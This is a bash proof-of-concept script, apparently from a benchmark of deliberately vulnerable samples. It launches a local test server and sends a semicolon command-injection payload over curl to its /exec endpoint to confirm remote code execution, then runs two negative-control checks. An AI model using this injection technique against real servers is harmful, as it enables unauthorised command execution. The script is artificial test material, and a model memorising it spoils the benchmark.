#!/usr/bin/env bash
# PoC for 095_onion_C2I2S3
# Axes: C2 (two flags + struct) / I2 (snprintf buffer then system()) / S3 (flag-gated check)
#
# Usage: ./PoC.sh
# Expected: prints uid= line confirming RCE as the server process user.
#
# S3 bypass: start without --safe-mode. The sanitization block is entirely skipped.
#
# The patched binary (onion_server) lives in this directory. If absent, run:
#   cd $(dirname $0) && bash build.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/onion_server"
WWWROOT="/tmp/poc_095_www"
MARKER="/tmp/poc_095_marker"
PORT=18095

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER"
}
trap cleanup EXIT

mkdir -p "$WWWROOT"

# ── start server (WITHOUT --safe-mode — bypasses S3 check) ────────────────────
echo "[*] starting onion_server with --exec-mode (no --safe-mode) on port $PORT..."
"$BINARY" --port "$PORT" --exec-mode --wwwroot "$WWWROOT" &
SERVER_PID=$!
sleep 0.5

# ── trigger ────────────────────────────────────────────────────────────────────
# S3 is skipped (--safe-mode not set); I2 copies cmd into snprintf buffer → system()
# Semicolon injection works since no guard is active
echo "[*] sending payload: cmd=id;id>${MARKER}"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id%3Bid>${MARKER}" > /dev/null || \
    curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# ── verify ─────────────────────────────────────────────────────────────────────
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# ── negative control 1: metacharacters blocked when --safe-mode active ─────────
echo "[*] verifying S3: metacharacters must be blocked when --safe-mode is set..."
NEG_SAFE_PORT=$((PORT + 100))
"$BINARY" --port "$NEG_SAFE_PORT" --exec-mode --safe-mode --wwwroot "$WWWROOT" &
SAFE_PID=$!
sleep 0.5
rm -f "$MARKER"
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_SAFE_PORT}/exec?cmd=id%3Bid" || true)
kill "$SAFE_PID" 2>/dev/null; wait "$SAFE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "400" ]]; then
    echo "[+] S3 check passed: semicolon blocked with 400 in --safe-mode"
else
    echo "[!] S3 check unexpected response: $HTTP_CODE"
fi

# ── negative control 2: endpoint absent without --exec-mode ───────────────────
echo "[*] verifying C2 gate: endpoint must be absent without --exec-mode..."
NEG_PORT=19095
"$BINARY" --port "$NEG_PORT" --wwwroot "$WWWROOT" &
GATE_PID=$!
sleep 0.5
HTTP_CODE=$(curl -sf -o /dev/null -w "%{http_code}" \
    "http://127.0.0.1:${NEG_PORT}/exec?cmd=id" || true)
kill "$GATE_PID" 2>/dev/null; wait "$GATE_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --exec-mode"
else
    echo "[!] gate check unexpected response: $HTTP_CODE"
fi
